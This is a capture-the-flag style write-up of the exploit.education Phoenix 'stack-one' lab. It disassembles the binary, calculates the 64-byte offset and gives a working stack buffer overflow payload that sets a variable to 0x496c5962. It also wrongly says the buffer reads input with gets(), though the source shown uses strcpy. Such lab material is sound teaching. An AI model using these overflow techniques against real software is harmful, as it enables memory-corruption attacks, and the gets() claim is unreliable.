# PHOENIX - stack 1

Lets list our files using ```ls -la```,

```
user@phoenix-amd64:~$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Jun  6 03:42 .
drwxr-xr-x 3 root root 4096 Jan 13  2019 ..
-rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout
-rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc
-rw-r--r-- 1 user user  675 Jan 13  2019 .profile
-rwxr-xr-x 1 user user 6176 Jun  6 03:41 stack-one
```

Lets view our file type of the binary using ```file``` command,
```
user@phoenix-amd64:~$ file stack-one
stack-one: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

It is a ```not stripped``` binary

Lets try running it,

```
user@phoenix-amd64:~$ ./stack-one
Welcome to phoenix/stack-one, brought to you by https://exploit.education
stack-one: specify an argument, to be copied into the "buffer"
user@phoenix-amd64:~$ ./stack-one monish
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962
```

It seems like we have to overwrite the ```0x496c5962``` value into the ```changeme``` variable

We didn't overwrite it yet,so it displays ```0x00000000``` in it

Lets view our binary in debugger,

Lets view the functions in it,

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400478  _init
0x00000000004004a0  strcpy@plt
0x00000000004004b0  printf@plt
0x00000000004004c0  puts@plt
0x00000000004004d0  errx@plt
0x00000000004004e0  exit@plt
0x00000000004004f0  __libc_start_main@plt
0x0000000000400500  _start
0x0000000000400516  _start_c
0x0000000000400540  deregister_tm_clones
0x0000000000400570  register_tm_clones
0x00000000004005b0  __do_global_dtors_aux
0x0000000000400640  frame_dummy
0x000000000040066d  main
0x0000000000400700  __do_global_ctors_aux
0x0000000000400742  _fini
```

Lets disassemble our ```main()``` function,

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000040066d <+0>:	  push   rbp
   0x000000000040066e <+1>:	  mov    rbp,rsp
   0x0000000000400671 <+4>:	  sub    rsp,0x60
   0x0000000000400675 <+8>:	  mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400678 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x000000000040067c <+15>:	mov    edi,0x400750
   0x0000000000400681 <+20>:	call   0x4004c0 <puts@plt>
   0x0000000000400686 <+25>:	cmp    DWORD PTR [rbp-0x54],0x1
   0x000000000040068a <+29>:	jg     0x4006a0 <main+51>
   0x000000000040068c <+31>:	mov    esi,0x4007a0
   0x0000000000400691 <+36>:	mov    edi,0x1
   0x0000000000400696 <+41>:	mov    eax,0x0
   0x000000000040069b <+46>:	call   0x4004d0 <errx@plt>
   0x00000000004006a0 <+51>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006a7 <+58>:	mov    rax,QWORD PTR [rbp-0x60]
   0x00000000004006ab <+62>:	add    rax,0x8
   0x00000000004006af <+66>:	mov    rdx,QWORD PTR [rax]
   0x00000000004006b2 <+69>:	lea    rax,[rbp-0x50]
   0x00000000004006b6 <+73>:	mov    rsi,rdx
   0x00000000004006b9 <+76>:	mov    rdi,rax
   0x00000000004006bc <+79>:	call   0x4004a0 <strcpy@plt>
   0x00000000004006c1 <+84>:	mov    eax,DWORD PTR [rbp-0x10]
   0x00000000004006c4 <+87>:	cmp    eax,0x496c5962
   0x00000000004006c9 <+92>:	jne    0x4006d7 <main+106>
   0x00000000004006cb <+94>:	mov    edi,0x4007d8
   0x00000000004006d0 <+99>:	call   0x4004c0 <puts@plt>
   0x00000000004006d5 <+104>:	jmp    0x4006eb <main+126>
   0x00000000004006d7 <+106>:	mov    eax,DWORD PTR [rbp-0x10]
   0x00000000004006da <+109>:	mov    esi,eax
   0x00000000004006dc <+111>:	mov    edi,0x400820
   0x00000000004006e1 <+116>:	mov    eax,0x0
   0x00000000004006e6 <+121>:	call   0x4004b0 <printf@plt>
   0x00000000004006eb <+126>:	mov    edi,0x0
   0x00000000004006f0 <+131>:	call   0x4004e0 <exit@plt>
End of assembler dump.
```

Lets view the source code of this binary for proper understanding,

```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

It is same like previous challenge,but here we have to overwrite the ```changeme``` variable with ```0x496c5962```

The main key of the program lies in this condition,

```
if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }
```

Checking the security mitigations of this binary,

```
ra@moni~/E/p/stack1> checksec stack-one
[*] '/home/ra/ExpDevPractice/phoenix/stack1/stack-one'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
```

It has no security mitigations in it, we can use the ```buffer``` to overwrite the ```changeme``` variable

Since ```buffer``` uses ```gets()``` for input,we can use this for overflow

In debugger we can see,

```
0x00000000004006a0 <+51>:	mov    DWORD PTR [rbp-0x10],0x0
```

It is used to initialize ```changeme``` ie. ```locals.changeme = 0```

```
0x00000000004006b2 <+69>:	lea    rax,[rbp-0x50]
```

It is used to load the buffer space for ```buffer```

Calculating the distance of these memory,

```
>>> int(0x50)
80
>>> int(0x10)
16
>>> print(80-16)
64
```

If we could pass 64 bytes of ```buffer``` and  extra bytes to ```buffer``` it would overwrite the ```changeme``` variable

Since it uses ```argv``` we should pass our input as argument

Lets try exploiting it,

```
user@phoenix-amd64:~$ ./stack-one $(python -c "print('A'*64)")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962
user@phoenix-amd64:~$ ./stack-one $(python -c "print('A'*64+'BBBB')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x42424242, we want 0x496c5962
```

Now we can successfully overwrite the ```changeme``` variable

But we have to overwrite it with ```0x496c5962``` correctly

Check the endian of your processor,
```
user@phoenix-amd64:~$ lscpu | grep Endian
Byte Order:            Little Endian
```

Since we are using little endian, ```0x496c5962``` should be passed as ```\x62\x59\x6c\x49```

```
user@phoenix-amd64:~$ ./stack-one $(python -c "print('A'*64+'\x62\x59\x6c\x49')")
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

Done! We have completed our challenge



